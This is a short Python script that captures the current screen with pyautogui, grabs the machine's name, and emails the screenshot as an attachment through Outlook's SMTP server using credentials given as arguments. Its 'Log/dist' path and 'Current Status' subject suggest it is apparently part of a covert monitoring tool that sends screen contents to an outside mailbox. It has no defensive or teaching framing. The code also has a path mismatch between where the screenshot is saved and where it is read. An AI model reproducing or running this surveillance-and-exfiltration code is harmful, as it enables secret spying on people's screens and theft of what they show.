#Screenshots
import pyautogui
import platform

#Email imports
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


#Some stuff
import sys
import os


def Send(email_Cred):
	
	msg = MIMEMultipart()
	msg['From'] = email_Cred[1]
	msg['To'] = email_Cred[1]
	msg['Subject'] = 'Current Status'

	User = os.getenv('USERNAME')

	#screenshot current screen
	filename='screenShit.png'
	pyautogui.screenshot('/Users/'+User+'/Log/dist/'+filename)





	#GRAB DEVICE NAME
	Device = platform.uname()[1]


	body = "Status on {}".format(Device)
	msg.attach(MIMEText(body,'plain')) 

	attachment  = open(filename,'rb')

	#EMAIL CREATION
	part = MIMEBase('application','octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition',"attachment; filename= "+ filename)

	msg.attach(part)
	text = msg.as_string()
	server = smtplib.SMTP('smtp.outlook.com',587)
	server.starttls()
	server.login(email_Cred[1],email_Cred[2])


	server.sendmail(email_Cred[1],email_Cred[1],text)
	server.quit()
	attachment.close() 
	



if __name__ == "__main__":
    Send(sys.argv)
